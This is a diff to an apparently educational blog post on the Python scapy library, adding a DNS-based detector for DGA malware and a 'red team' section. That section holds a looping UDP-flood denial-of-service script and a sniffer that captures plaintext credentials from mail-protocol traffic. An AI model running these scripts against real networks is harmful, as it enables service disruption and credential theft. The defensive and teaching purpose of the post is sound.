@@ -209,7 +209,7 @@ Packet No.5 has chksum = 0x2b0a
 
 
 
-## Examples  
+## Examples [blue team]
 Let's see some relevant examples where we would need to get the same field from each packet.
 
 ### Example 1: Exfiltration via port number - NIXU Challenge
@@ -354,7 +354,89 @@ Running our script, we indeed get back the reconstructed zip file:
 ![oldest trick5](/posts/scapy/oldest_trick5.png)  
 
 
-## Summary
-There are so many attributes that a packet has that it would be such an extensive post to go through all of them. The goal of this post was to simply show how can someone play around with scapy and python's interactive mode in order to easily identify the attribute of interest.  
+### Example 3: Detecting suspicious IP addresses
+In this and final example, we will see an overview of how we could identify a suspicious IP address that tries to DoS a website, or a possible C2 server communicating with a victim machine.  
+The presented code is taken from the [Cyber Defense Lab of the Royal Military Academy in Belgium blog](https://cylab.be/blog/245/network-traffic-analysis-with-python-scapy-and-some-machine-learning), so for further information related to the example you can read this blog:)  
 
-I hope this post was of some use and that you learned something:)
+According to this blog, the following part of code using scapy is very similar to the approach of how a SIEM software would create alerts.
+```python
+from scapy.all import *
+
+packets = PcapReader("capture.pcap")
+
+counts = {}
+# QR = Query Response
+# ANCOUNT = Answer Count
+# https://datatracker.ietf.org/doc/html/rfc5395#section-2
+for packet in packets:
+    if packet.haslayer(DNS) and packet[DNS].qr == 1 and packet[DNS].ancount == 0:
+        # DNS query returned no answer
+        # extract the destination IP (device that sent the query)
+        ip = packet[IP].dst
+        counts[ip] = counts.get(ip, 0) + 1
+
+threshold = 100
+
+print("+ Create list of suspicious IP addresses ...")
+suspicious = []
+for ip, occurrences in counts.items():
+    if occurrences < threshold:
+        continue
+    suspicious.append(ip)
+
+print(suspicious)
+```
+This code sample was made for detecting DGA malware, a malware that would receive a lot of DNS replies (```packet[DNS].qr == 1```) with no answer (```packet[DNS].ancount == 0```).  
+
+So the purpose of the script would be to create a dictionary of IP addresses found in the pcap file and identify such IP addresses that would generate the DNS traffic.  
+Here, the threshold is 100 and it probably would create a lot of false positives depending on the victim's network (i.e. for a coorporate network we would have a lot of false positives with that threshold).  The blog goes through details of how you could use statistics to find the threshold value in a sensible way.
+
+## Examples [red team]
+Beside using scapy to solve a CTF challenge or maybe create a SIEM type of software, scapy can be also used for neferious purposes.
+
+### Example 1: UDP flood for DoS
+An example of using scapy for flooding a target IP with UDP packets, which as a result causes the system to process these packets rather than legitimate ones (resulting in a Dos), is the following simple PoC script:  
+```python
+from scapy.all import *
+
+send(IP(dst="some_target_IP")/fuzz(UDP()),loop=1)
+```
+Using the ```fuzz(UDP())``` function, the script generates random variations of UDP packets, and since it also uses ```loop=1``` which makes the script run continuously, it overwhelms the target machine resulting in a Dos.
+
+### Example 2: Sniffing traffic to steal plaintext credentials
+Another cool example of using scapy for malicious purposes is the one where you could make a sniffer and try to find plaintext credentials in TCP packets:  
+
+```python
+from scapy.all import sniff, TCP, IP
+
+def packet_callback(packet):
+    if packet[TCP].payload:
+        mypacket = str(packet[TCP].payload)
+        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
+            print(f"[*] Destination: {packet[IP].dst}")
+            print(f"[*] {str(packet[TCP].payload)}")
+
+sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',prn=packet_callback, store=0)
+```
+With this script, a sniffer is set to run continuously, filtering on specific tcp ports and calling the ```packet_callback``` function for each new packet.  
+
+If the found packet has some payload (data) inside the TCP layer, then the script checks whether words such as ```user``` or ```pass``` exist in it, since that would mean potential credentials are being transmitted.  
+
+If all the above are true, the script prints the destination of the packet (where the credentials would be used) but also the credentials themselfs.
+
+## Summary
+In this post we did an overview of how scapy can be used for both defensive and offensive purposes, but also for just some fun CTF challenges.  
+The attributes that each packet has and how these could be used for all the forementioned purposes are too many and would require a really extensive post, which was not the goal of this post.  
+
+The goal for this post was to get a bit more familiar with scapy and show how to approach a problem by crafting a script part by part with the help of the interactive mode and the various keywords we used in order to find what you are looking for. I hope you had as much fun reading this as I had writing it:)
+
+**References**
+<blockquote>
+    <ul>
+        <li> [1] <a href="https://scapy.readthedocs.io/en/latest/">Scapy: <i>Welcome to Scapy's documentation!</i></a></li>
+        <li> [2] <a href="https://cylab.be/blog/245/network-traffic-analysis-with-python-scapy-and-some-machine-learning">Thibault Debatty: <i>Network traffic analysis with Python, Scapy (and some Machine Learning)</i></a></li>
+        <li> [3] <a href="https://github.com/ep4sh/pyddos/tree/master">pyddos: <i>Examples of python SCAPY lib for DDOS (udp, syn flood etc).</i></a></li>
+        <li> [4] <a href="https://medium.com/@MonlesYen/python-for-cybersecurity-30-scapy-351cc6fe9e7a">Yen: <i>Python for Cybersecurity 30 — Scapy</i></a></li>
+</i></a></li>
+    </ul>
+</blockquote>
